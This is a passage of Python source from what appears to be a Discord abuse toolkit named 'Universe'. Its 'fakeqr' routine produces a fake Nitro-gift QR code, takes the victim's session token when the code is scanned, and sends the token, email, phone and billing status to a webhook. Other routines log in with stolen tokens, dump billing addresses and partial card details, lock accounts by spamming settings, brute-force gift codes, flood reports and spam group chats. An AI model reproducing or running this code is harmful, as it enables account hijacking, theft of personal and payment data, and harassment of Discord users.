            if choice == "1":
                Universe.config.edit('saved', 'false')
                Universe.config.edit('injected', 'false')
                method()
            elif choice == "2":
                logoprincipal()
                os.system('St\e5\playlist')
                launch()
            elif choice == "3":
                logoprincipal()
                Universe.config.edit('music', 'false')
                Universe.print.normal(f'Music {Universe.banner.horizontal_bar} Off')
                Universe.pause()
                launch()
            elif choice == "4":
                logoprincipal()
                Universe.config.edit('music', 'true')
                Universe.print.normal(f'Music {Universe.banner.horizontal_bar} On')
                Universe.pause()
                launch()
            elif choice == "5":
                pass
            else:
                choice()
        Universe.pause()
        launch()
    if cmd == "exit":
        exit()
    if cmd == "restart":
        Universe.restart()
    if cmd == "premium":
        menulist = ["unverifytoken", "tokeninfo", "massreport", "fakeqr", "tokenlogin", "tokenlock", "purgedm", "massgroup", "nitrofarm"]
        Universe.print.menu(menulist)
        Universe.pause()
        launch()
    if cmd == "linkvertise":
       if idlog == premium_saveid and premium_status == "exact":
           headers = {
               "Host": "bypass.bot.nu",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
               "Accept": "*/*",
               "Accept-Language": "en-US,en;q=0.5",
               "Accept-Encoding": "gzip, deflate, br",
               "Referer": "https://bypass.bot.nu/",
               "Connection": "keep-alive",
           }
           link = input(f'{Universe.print.input}Enter The Linkvertise Link : ')
           try:
               data = requests.get(f"https://bypass.bot.nu/bypass2?url={link}", headers=headers)
               link = data.json()["destination"]
               Universe.print.normal(True, f"Real Link :{Fore.GREEN} {link}{Fore.RESET}")
           except:
               Universe.print.error(f"An unexpected error occurred")
       else:
           Universe.print.normal(True, 'You Are Not Premium')
       Universe.pause()
       launch()
    if cmd == "massgroup":
        def massgroupmenu():
            thread1 = []
            p = []
            for line in open("St/e9/groups.txt"):
                p.append(line.strip("\n"))
            Universe.clear()
            logoprincipal()
            g = f"\033[38;2;1;1;255m"
            r = f"{Fore.RESET}"
            print(f'''

            {g}[{r}01{g}] {r}Create Groups
            {g}[{r}02{g}] {r}Add User From Groups
            {g}[{r}03{g}] {r}Remove User From Groups
            {g}[{r}04{g}] {r}Rechange Icon Of Groups                
            {g}[{r}05{g}] {r}Rename Groups       
            {g}[{r}06{g}] {r}Scrape All Groups
            {g}[{r}07{g}] {r}Leave All Groups   
            {g}[{r}08{g}] {r}Send Msg (bug)
            {g}[{r}09{g}] {r}Scrape Proxies
            {g}[{r}10{g}] {r}Reset Scraped Groups
            {g}[{r}11{g}] {r}Exit

                        ''')

            command = input(f'{Universe.print.input}Enter Number : ')
            if command == "1":
                token = Universe.crypt.decode("T")
                group = input(f'{Universe.print.input}Group Names: ')
                manygroup = int(input(f'{Universe.print.input}How Many Groups ( 10 max ): '))
                for i in range(manygroup):
                    try:
                        rr = requests.post('https://discord.com/api/v9/users/@me/channels', headers={'Authorization': token}, json={"recipients": []})
                        jsr = json.loads(rr.content)
                        groupID = jsr['id']
                        time.sleep(0.5)
                        r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers={'Authorization': token}, json={'name': group})
                        if r1.status_code == 200:
                            Universe.print.normal(True, 'Group created')
                        with open("St/e9/groups.txt", "a") as groupID:
                            groupID.write(jsr['id'] + '\n')
                    except:
                        Universe.print.error(f'RateLimited for {jsr["retry_after"]} seconds')
                        time.sleep(2)
                massgroupmenu()
            if command == "2":
                rtoken = Universe.crypt.decode("T")
                def add():
                    headers = {"Authorization": rtoken}
                    url = f'https://discord.com/api/v9/channels/{gcs}/recipients/{userid}'
                    response = requests.put(url, headers=headers, proxies={"http": f'{Universe.proxy.proxy()}'})
                    json_resp = json.loads(response.content)
                    if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                        Universe.print.normal(True, f"Added User -> {gcs}")
                    elif response.status_code == 429:
                        Universe.print.error(f'Please wait {json_resp["retry_after"]} seconds')
                        time.sleep(2)
                    else:
                        Universe.print.error(f'HTTP ERROR -> {response.status_code}')

                userid = input(f'{Universe.print.input}User ID: ')
                for gcs in p:
                    thread = threading.Thread(target=add, args=(), daemon=True)
                    thread.start()
                    thread1.append(thread)
                for thread in thread1:
                    thread.join()
                massgroupmenu()
            if command == "3":
                token = Universe.crypt.decode("T")
                def remove():
                    global count
                    headers = {"Authorization": token,
                               "Content-Type": "application/json"}
                    url = f'https://discord.com/api/v9/channels/{gcs}/recipients/{userid}'
                    response = requests.delete(url, headers=headers, proxies={"http": f'{Universe.proxy.proxy()}'})
                    if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                        Universe.print.normal(True, f'Removed User -> {gcs}')
                    else:
                        Universe.print.error(f'HTTP ERROR -> {response.status_code}')

                userid = input(f"{Universe.print.input}Target ID : ")
                for gcs in p:
                    thread = threading.Thread(target=remove, args=(), daemon=True)
                    thread.start()
                    thread1.append(thread)
                for thread in thread1:
                    thread.join()
                massgroupmenu()
            if command == "4":
                token = Universe.crypt.decode("T")
                icondir = input(f'{Universe.print.input}Enter Icon File Directory : ')
                icon = base64.b64encode(open(str(icondir).replace('"', ''), 'rb').read()).decode('utf-8')
                icon = f'data:image/png;base64,%s' % icon
                def reicon():
                    headers = {"Authorization": token,
                               "Content-Type": "application/json"}
                    url = f'https://discord.com/api/v9/channels/{gcs}'
                    payload = {"icon": f'{icon}'}
                    response = requests.patch(url=url, headers=headers, json=payload, proxies={"http": f'{Universe.proxy.proxy()}'})
                    if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                        Universe.print.normal(True, f'Reicon -> {gcs}')
                    else:
                        Universe.print.error(f'HTTP ERROR -> {response.status_code}')

                for gcs in p:
                    thread = threading.Thread(target=reicon, args=(), daemon=True)
                    thread.start()
                    thread1.append(thread)
                for thread in thread1:
                    thread.join()
                massgroupmenu()
            if command == "5":
                token = Universe.crypt.decode("T")
                name = input(f"{Universe.print.input}Name : ")
                def rename():
                    headers = {"Authorization": token, "Content-Type": "application/json"}
                    url = f'https://discord.com/api/v9/channels/{gcs}'
                    payload = {"name": f'{name}'}
                    response = requests.patch(url=url, headers=headers, json=payload, proxies={"http": f'{Universe.proxy.proxy()}'})
                    if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                        Universe.print.normal(True, f'Renamed -> {gcs}')
                    else:
                        Universe.print.error(f'HTTP ERROR -> {response.status_code}')

                for gcs in p:
                    thread = threading.Thread(target=rename, args=(), daemon=True)
                    thread.start()
                    thread1.append(thread)
                for thread in thread1:
                    thread.join()
                massgroupmenu()
            if command == "6":
                token = Universe.crypt.decode("T")
                client = discord.Client()
                intents = discord.Intents.all()
                client = commands.Bot(command_prefix="l", case_insensitive=False, self_bot=True, intents=intents)

                @client.event
                async def on_ready():
                    await scrape()

                @client.event
                async def scrape():
                    number = 0
                    if os.path.isfile("St/e9/groups.txt"):
                        os.remove('St/e9/groups.txt')
                    with open('St/e9/groups.txt', 'a') as txt:
                        for channel in client.private_channels:
                            if isinstance(channel, discord.GroupChannel):
                                txt.write(str(channel.id) + '\n')
                                Universe.print.normal(True, 'Scraped 1 Group !')
                                number += 1
                            Universe.print.normal(True, f'Scraped {number}')
                    massgroupmenu()

                client.run(token, bot=False)
            if command == "7":
                token = Universe.crypt.decode("T")
                client = discord.Client()

                @client.event
                async def on_ready():
                    for channel in client.private_channels:
                        if isinstance(channel, discord.GroupChannel):
                            await channel.leave()
                            Universe.print.normal(True, "Left a group: " + str(channel.id))  # Print
                    await client.close()

                client.run(token, bot=False)
                massgroupmenu()
            if command == "8":
                token = Universe.crypt.decode("T")
                def sendmsg():
                    headers = {"Authorization": token}
                    url = f'https://discord.com/api/v9/channels/{gcs}/messages'
                    payload = {"content": message, "nonce": gcs}
                    response = requests.post(url=url, headers=headers, json=payload, proxies={"http": f'{Universe.proxy.proxy()}'})
                    if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                        Universe.print.normal(True, f'Sent message -> {gcs}')
                    else:
                        Universe.print.error(f'HTTP ERROR -> {response.status_code}')

                message = input(f"{Universe.print.input}Message : ")
                for gcs in p:
                    thread = threading.Thread(target=sendmsg, args=(), daemon=True)
                    thread.start()
                    thread1.append(thread)
                for thread in thread1:
                    thread.join()
                massgroupmenu()
            if command == "9":
                proxy_scrape()
                massgroupmenu()
            if command == "10":
                if os.path.isfile("St/e9/groups.txt"):
                    os.remove('St/e9/groups.txt')
                    Universe.print.normal(True, 'Groups ID reseted !')
                else:
                    Universe.print.error('No Groups ID !')
                time.sleep(1.75)
                massgroupmenu()
            if command == "11":
                launch()
        if idlog == premium_saveid and premium_status == "exact":
            massgroupmenu()
        else:
            Universe.print.normal(True, 'You Are Not Premium')
            Universe.pause()
            launch()
    if cmd == "nitrofarm":
        def nitrofarm():
            thread1 = []
            num = int(input(f"{Universe.print.input}Amount Of Codes : "))
            method = input(f'{Universe.print.input}Valid Codes Posted In Webhook (y/n): ')
            if method == "y":
                def startfarm(webhook):
                    ncode = ''.join(
                        random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in
                        range(16))
                    nitro = f"https://discord.com/gifts/{ncode}"
                    embed = {
                        "description": f"{nitro}",
                        "title": "NitroFarm - Valid Nitro Code"
                    }
                    data = {
                        "content": ">||@here||<",
                        "username": "Universe",
                        "embeds": [
                            embed
                        ],
                    }
                    url = "https://discordapp.com/api/v9/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
                    r = requests.get(url, json=data, proxies={"http": f'{Universe.proxy.proxy()}'})
                    if r.status_code == 200:
                        Universe.print.normal(True, f'Working - {nitro}')
                        requests.post(webhook, json=data, proxies={"http": f'{Universe.proxy.proxy()}'})
                    else:
                        Universe.print.normal(False, f'Not Working - {nitro}')

                embed = {
                    "description": f"All Valid Codes Will Be Posted Here !",
                    "title": "NitroFarm - Start"
                }

                content = {
                    "content": ":3",
                    "username": "Universe",
                    "embeds": [
                        embed
                    ],
                }
                webhook = input(f'{Universe.print.input}Enter Webhook : ')
                response = requests.post(webhook, json=content, proxies={"http": f'{Universe.proxy.proxy()}'})
                if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                    pass
                else:
                    Universe.print.error('Webhook Not Working')
                    Universe.pause()
                    launch()
                for i in range(num):
                    thread = threading.Thread(target=startfarm, args=(webhook,))
                    thread.start()
                    thread1.append(thread)
                for thread in thread1:
                    thread.join()
                embed = {
                    "description": f"Finished Farming Codes",
                    "title": "NitroFarm - End"
                }
                content = {
                    "content": "",
                    "username": "Universe",
                    "embeds": [
                        embed
                    ],
                }
                requests.post(webhook, json=content, proxies={"http": f'{Universe.proxy.proxy()}'})
            elif method == "n":
                def startfarm():
                    ncode = ''.join(
                        random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in
                        range(16))
                    nitro = f"https://discord.com/gifts/{ncode}"
                    url = "https://discordapp.com/api/v9/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
                    r = requests.get(url, proxies={"http": f'{Universe.proxy.proxy()}'})
                    if r.status_code == 200:
                        Universe.print.normal(True, f'Working - {nitro}')
                    else:
                        Universe.print.normal(False, f'Not Working - {nitro}')
                for i in range(num):
                    thread = threading.Thread(target=startfarm, args=())
                    thread.start()
                    thread1.append(thread)
                for thread in thread1:
                    thread.join()
            else:
                nitrofarm()
            Universe.print.normal(True, f'Finished Farming Codes')
        if idlog == premium_saveid and premium_status == "exact":
            nitrofarm()
            Universe.pause()
            launch()
        else:
            Universe.print.normal(True, 'You Are Not Premium')
            Universe.pause()
            launch()
    if cmd == "tokenlock":
        def tokenlock():
            thread1 = []
            logoprincipal()
            token = input(f'{Universe.print.input}Enter Token To Lock Account : ')
            r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
            if r.status_code == 200:
                threads = 3
                num = print('Control + X For Stop ')
                def lock(token):
                    while True:
                        setting = {'theme': random.choice(['dark', 'light']),
                                   'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                        requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': token, 'Content-Type': 'application/json'}, json=setting)
                for i in range(int(threads)):
                    t = multiprocessing.Process(target=lock, args=(token,))
                    t.start()
                    thread1.append(t)
                while True:
                    if keyboard.is_pressed('ctrl+x'):
                        for process in thread1:
                            process.terminate()
                        launch()
                        break
                Universe.print.normal(True, 'Finished Lock Loop')
                Universe.pause()
                launch()
            else:
                logoprincipal()
                Universe.print.error('Token Invalid')
                Universe.pause()
                launch()
        if idlog == premium_saveid and premium_status == "exact":
            tokenlock()
        else:
            Universe.print.normal(True, 'You Are Not Premium')
            Universe.pause()
            launch()

    if cmd == "tokenlogin":
        def login(rtoken):
            if rtoken == "mine":
                token = Universe.crypt.decode("T")
            else:
                token = rtoken
            logoprincipal()
            s = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=s)
            driver.maximize_window()
            driver.get('https://discord.com/login')
            js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
            driver.execute_script(js + f'login("{token}")')
            time.sleep(10)
            if driver.current_url == 'https://discord.com/login':
                logoprincipal()
                Universe.print.error(f"Token Expired or Invalid")
                driver.close()
                Universe.pause()
                launch()
            else:
                logoprincipal()
                Universe.print.normal(True, 'Connection successful')
                Universe.pause()
                launch()

        if idlog == premium_saveid and premium_status == "exact":
            try:
                rtoken = str(input(f"{Universe.print.input}Enter The Token (mine/token): "))
                login(rtoken)
            except selenium.common.exceptions.SessionNotCreatedException as e:
                Universe.print.error('Error - Session Not Created')
                Universe.pause()
                launch()
        else:
            Universe.print.normal(True, 'You Are Not Premium')
            Universe.pause()
            launch()

    if cmd == "purgedm":
        if idlog == premium_saveid and premium_status == "exact":
            logoprincipal()
            token = input(f"{Universe.print.input}Enter Token To PurgeDM : ")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
                'Authorization': token
            }
            dms = requests.get(
                "https://discord.com/api/v9/users/@me/channels",
                headers=headers
            ).json()
            Universe.print.normal(True, f"""DM channels found\n""")
            Universe.pause()

            for i in dms:
                Universe.print.normal(True, f"""Leaving DM channel with: {', '.join([x['username'] for x in i['recipients']])}""")
                responce = requests.delete(
                    f"https://discord.com/api/v9/channels/{i['id']}",
                    headers=headers
                )
            Universe.print.normal(True, f"Finished Purging DMs")
            Universe.pause()
            launch()
    if cmd == "unverifytoken":
        g = f"{Fore.BLUE}"
        r = f"{Fore.RESET}"
        if idlog == premium_saveid and premium_status == "exact":
            logoprincipal()
            token = input(f'{Universe.print.input}Token To Unverify : ')
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if r.status_code == 200:
                r = requests.post('https://discordapp.com/api/v9/users/@me/relationships', headers={'Authorization': token, 'User-Agent': 'discordbot'}, json={'username': 'disco3', 'discriminator': 8005})
                if r.status_code == 204:
                    Universe.print.normal(True, f"Account Unverified ! ( unverify by Tyxer )")
                    Universe.print.normal(True, f"Press (enter) to continue")
                    while True:
                        Universe.pause()
                        launch()
                    else:
                        Universe.print.error(f"Error !")
                        Universe.pause()
                        launch()
        else:
            Universe.print.normal(True, 'You Are Not Premium')
            Universe.pause()
            launch()
    if cmd == "massreport":
        token = Universe.crypt.decode("T")
        if idlog == premium_saveid and premium_status == "exact":
            class massreport:
                def __init__(self):
                    logoprincipal()
                    self.GUILD_ID = str(input(f"{Universe.print.input}Guild ID: """))
                    self.CHANNEL_ID = str(input(f"{Universe.print.input}Channel ID: """))
                    self.MESSAGE_ID = str(input(f"{Universe.print.input}Message ID: """))
                    Universe.print.normal(True, "Choose the reason for the report: ")
                    Universe.print.normal(True, f"""            [1] Illegal content""")
                    Universe.print.normal(True, f"""            [2] Harassment""")
                    Universe.print.normal(True, f"""            [3] Spam or phishing links""")
                    Universe.print.normal(True, f"""            [4] Self-harm""")
                    Universe.print.normal(True, f"""            [5] NSFW content\n""")
                    REASON = input(f"{Universe.print.input}Choice: ")

                    if REASON == '1':
                        self.REASON = 0
                    elif REASON == '2':
                        self.REASON = 1
                    elif REASON == '3':
                        self.REASON = 2
                    elif REASON == '4':
                        self.REASON = 3
                    elif REASON == '5':
                        self.REASON = 4
                    else:
                        Universe.print.error(f"Request Invalid")
                        time.sleep(2)
                        main()

                    self.RESPONSES = {f"""
                        401: Unauthorized: [¤] Invalid Discord token,
                        Missing Access: [¤] Missing access to channel or guild,
                        You need to verify your account in order to perform this action: [¤] Unverified"""}
                    self.sent = 0
                    self.errors = 0

                def _reporter(self):
                    report = requests.post(
                        'https://discordapp.com/api/v9/report', json={
                            'channel_id': self.CHANNEL_ID,
                            'message_id': self.MESSAGE_ID,
                            'guild_id': self.GUILD_ID,
                            'reason': self.REASON
                        }, headers={
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate',
                            'Accept-Language': 'sv-SE',
                            'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                            'Content-Type': 'application/json',
                            'Authorization': self.TOKEN
                        }
                    )
                    if (status := report.status_code) == 201:
                        self.sent += 1
                        Universe.print.normal(True, "Reported successfully")
                    elif status in (401, 403):
                        print(self.RESPONSES[report.json()['message']])
                    else:
                        Universe.print.error(f"Error: {report.text} | Status Code: {status}")

                def _update_title(self):
                    while True:
                        os.system(f'title [Reporter] - Sent: {self.sent}')
                        time.sleep(0.1)

                def _multi_threading(self):
                    threading.Thread(target=self._update_title).start()
                    while True:
                        if threading.active_count() <= 300:
                            time.sleep(1)
                            threading.Thread(target=self._reporter).start()

                def setup(self):
                    recognized = None
                    if os.path.exists(config_json := 'St/Config.json'):
                        with open(config_json, 'r') as f:
                            try:
                                data = json.load(f)
                                self.TOKEN = data['discordToken']
                            except (KeyError, json.decoder.JSONDecodeError):
                                recognized = False
                            else:
                                recognized = True
                    else:
                        recognized = False

                    if not recognized:
                        self.TOKEN = token
                        with open(config_json, 'w') as f:
                            json.dump({'discordToken': self.TOKEN}, f)
                    print()
                    self._multi_threading()
            mr = massreport()
            mr.setup()
            Universe.title()
        else:
            Universe.print.normal(True, 'You Are Not Premium')
            Universe.pause()
            launch()
    if cmd == "tokeninfo":
        def Tokeninfo(token):
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            }
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            cc_digits = {
                'american express': '3',
                'visa': '4',
                'mastercard': '5'
            }
            badges = ""
            Discord_Employee = 1
            Partnered_Server_Owner = 2
            HypeSquad_Events = 4
            Bug_Hunter_Level_1 = 8
            House_Bravery = 64
            House_Brilliance = 128
            House_Balance = 256
            Early_Supporter = 512
            Bug_Hunter_Level_2 = 16384
            Early_Verified_Bot_Developer = 131072

            flags = r.json()['flags']
            if (flags == Discord_Employee):
                badges += "Staff, "
            if (flags == Partnered_Server_Owner):
                badges += "Partner, "
            if (flags == HypeSquad_Events):
                badges += "Hypesquad Event, "
            if (flags == Bug_Hunter_Level_1):
                badges += "Green Bughunter, "
            if (flags == House_Bravery):
                badges += "Hypesquad Bravery, "
            if (flags == House_Brilliance):
                badges += "HypeSquad Brillance, "
            if (flags == House_Balance):
                badges += "HypeSquad Balance, "
            if (flags == Early_Supporter):
                badges += "Early Supporter, "
            if (flags == Bug_Hunter_Level_2):
                badges += "Gold BugHunter, "
            if (flags == Early_Verified_Bot_Developer):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"

            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            language = r.json()['locale']
            mfa = r.json()['mfa_enabled']
            avatar_id = r.json()['avatar']
            has_nitro = False
            res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers)
            nitro_data = res.json()
            has_nitro = bool(len(nitro_data) > 0)
            avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
            creation_date = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')

            if has_nitro:
                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                days_left = abs((d2 - d1).days)

            billing_info = []
            for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources',
                                  headers=headers).json():
                y = x['billing_address']
                name = y['name']
                address_1 = y['line_1']
                address_2 = y['line_2']
                city = y['city']
                postal_code = y['postal_code']
                state = y['state']
                country = y['country']
                if x['type'] == 1:
                    cc_brand = x['brand']
                    cc_first = cc_digits.get(cc_brand)
                    cc_last = x['last_4']
                    cc_month = str(x['expires_month'])
                    cc_year = str(x['expires_year'])
                    data = {
                        'Payment Type': 'Credit Card',
                        'Valid': not x['invalid'],
                        'CC Holder Name': name,
                        'CC Brand': cc_brand.title(),
                        'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in
                                             enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                        'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment': x['default']
                    }
                elif x['type'] == 2:
                    data = {
                        'Payment Type': 'PayPal',
                        'Valid': not x['invalid'],
                        'PayPal Name': name,
                        'PayPal Email': x['email'],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment': x['default']
                    }
                billing_info.append(data)
            printbar = Universe.banner.horizontal_bar * 12
            Universe.print.center(f'<<{printbar}{userName}{printbar}>>')
            print(f'User ID         {userID}')
            print(f'Created at      {creation_date}')
            print(f'Language        {language}')
            print(f'Badges          {badges}')
            print(f'Avatar URL      {avatar_url if avatar_id else ""}')
            print(f'Token           {token}')
            Universe.print.center(f'<{printbar}Security Info{printbar}>')
            print(f'2 Factor        {mfa}')
            print(f'Email           {email}')
            print(f'Phone number    {phone if phone else ""}')
            Universe.print.center(f'<{printbar}Nitro Info{printbar}>')
            print(f'Nitro Status    {has_nitro}')
            print(f'Expires in      {days_left if has_nitro else "0"} day(s)')
            if len(billing_info) > 0:
                Universe.print.center(f"<{printbar}Billing Info{printbar}>")
                if len(billing_info) == 1:
                    for x in billing_info:
                        for key, val in x.items():
                            if not val:
                                continue
                            print(
                                f"[{Fore.RED}" + '{:<23}{:<10}{}'.format(key + Fore.RED + Fore.RESET + "]", Fore.RESET,
                                                                         val))
                else:
                    for i, x in enumerate(billing_info):
                        title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                        print('' + title)
                        print('' + ('=' * len(title)))
                        for j, (key, val) in enumerate(x.items()):
                            if not val or j == 0:
                                continue
                            print(
                                f"[{Fore.RED}" + '{:<23}{:<10}{}'.format(key + Fore.RED + Fore.RESET + "]", Fore.RESET,
                                                                         val))
                        if i < len(billing_info) - 1:
                            print(f'{Fore.RESET}\n')
                print(f'{Fore.RESET}')
        if idlog == premium_saveid and premium_status == "exact":
            rtoken = input(f'{Universe.print.input}Enter Token : ')
            Tokeninfo(rtoken)
        else:
            Universe.print.normal(True, 'You Are Not Premium')
        Universe.pause()
        launch()
    if cmd == "fakeqr":
        def logo_qr():
            # Paste the discord logo onto the QR code
            im1 = Image.open('St/e4/temp_qr_code.png', 'r')
            im2 = Image.open('St/e4/overlay.png', 'r')
            im1.paste(im2, (60, 55), im2)
            im1.save('St/e4/Qr_Code.png', quality=95)

        def paste_template():
            # paste the finished QR code onto the nitro template
            im1 = Image.open('St/e4/template.png', 'r')
            im2 = Image.open('St/e4/Qr_Code.png', 'r')
            im1.paste(im2, (120, 409))
            im1.save('Temp/discord_gift.png', quality=95)

        def fakeqr(Webhook):
            type_ = Universe.driver.getDriver()
            if type_ == "chromedriver.exe":
                opts = webdriver.ChromeOptions()
                opts.add_experimental_option('excludeSwitches', ['enable-logging'])
                opts.add_experimental_option("detach", True)
                try:
                    driver = webdriver.Chrome(options=opts)
                except common.exceptions.SessionNotCreatedException as e:
                    Universe.print.error(msg.e)
                    Universe.pause()
                    launch()
            elif type_ == "operadriver.exe":
                opts = webdriver.opera.options.ChromeOptions()
                opts.add_experimental_option('excludeSwitches', ['enable-logging'])
                opts.add_experimental_option("detach", True)
                try:
                    driver = webdriver.Opera(options=opts)
                except common.exceptions.SessionNotCreatedException as e:
                    Universe.print.error(msg.e)
                    Universe.pause()
                    launch()
            elif type_ == "msedgedriver.exe":
                opts = webdriver.EdgeOptions()
                opts.add_experimental_option('excludeSwitches', ['enable-logging'])
                opts.add_experimental_option("detach", True)
                try:
                    driver = webdriver.Edge(options=opts)
                except common.exceptions.SessionNotCreatedException as e:
                    Universe.print.error(msg.e)
                    Universe.pause()
                    launch()
            else:
                Universe.print.error("No Driver For Create Qr Code")
                Universe.pause()
                launch()
            driver.get('https://discord.com/login')
            time.sleep(3)
            page_source = driver.page_source
            soup = bs4(page_source, features='html.parser')
            # Create the QR code
            div = soup.find('div', {'class': 'qrCode-2R7t9S'})
            qr_code = div.find('img')['src']
            file = os.path.join(os.getcwd(), 'St/e4/temp_qr_code.png')
            img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
            with open(file, 'wb') as handler:
                handler.write(img_data)

            discord_login = driver.current_url
            logo_qr()
            paste_template()

            Universe.print.normal(True, f'QR Code generated in ' + os.getcwd() + "\\Temp")
            Universe.print.event(f'You Must Have The Driver Open For Get Token')
            Universe.print.event(f'Send Fake QR Code to user and wait to the user scan it')
            os.startfile(os.getcwd() + "\\Temp")
            # Waiting for them to scan QR code
            while True:
                def getheaders(token=None):
                    heads = [
                        {
                            "Content-Type": "application/json",
                            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
                        },

                        {
                            "Content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
                        },

                        {
                            "Content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
                        },

                        {
                            "Content-Type": "application/json",
                            'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
                        },

                        {
                            "Content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
                        },

                        {
                            "Content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                        }
                    ]
                    headers = random.choice(heads)
                    if token:
                        headers.update({"Authorization": token})
                    return headers
                if discord_login != driver.current_url:
                    token = driver.execute_script('''
            token = (webpackChunkdiscord_app.push([
                [''],
                {},
                e=>{m=[];for(
                        let c in e.c)
                        m.push(e.c[c])}
                ]),m)
                .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
            return token;
                        ''')
                    j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
                    badges = ""
                    flags = j['flags']
                    if (flags == 1): badges += "Staff, "
                    if (flags == 2): badges += "Partner, "
                    if (flags == 4): badges += "Hypesquad Event, "
                    if (flags == 8): badges += "Green Bughunter, "
                    if (flags == 64): badges += "Hypesquad Bravery, "
                    if (flags == 128): badges += "HypeSquad Brillance, "
                    if (flags == 256): badges += "HypeSquad Balance, "
                    if (flags == 512): badges += "Early Supporter, "
                    if (flags == 16384): badges += "Gold BugHunter, "
                    if (flags == 131072): badges += "Verified Bot Developer, "
                    if (badges == ""): badges = "None"

                    user = j["username"] + "#" + str(j["discriminator"])
                    email = j["email"]
                    phone = j["phone"] if j["phone"] else "No Phone Number attached"

                    url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.webp'
                    try:
                        requests.get(url)
                    except:
                        url = url[:-4]
                    nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
                    has_nitro = False
                    has_nitro = bool(len(nitro_data) > 0)
                    billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)

                    embed = {
                        "username": "Universe",
                        "avatar_url": "https://cdn.discordapp.com/attachments/937676143761440799/952550401205485588/universe.png",
                        "embeds": [
                            {
                                "author": {
                                    "name": "Universe",
                                    "url": "https://tokon.site.xyz/onlineshop",
                                    "icon_url": "https://cdn.discordapp.com/attachments/937676143761440799/952550401205485588/universe.png"
                                },
                                "description": f"**{user}** Grabbed By QR code\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
                                "fields": [
                                    {
                                        "name": "**Token**",
                                        "value": f"```\n{token}```",
                                        "inline": False
                                    }
                                ],
                                "color": 2492395,

                                "footer": {
                                    "text": "https://tokon.site.xyz/softwares"
                                }
                            }
                        ]
                    }
                    requests.post(Webhook, json=embed)
                    Universe.print.normal(True, "Posted Grabbed User With Webhook")
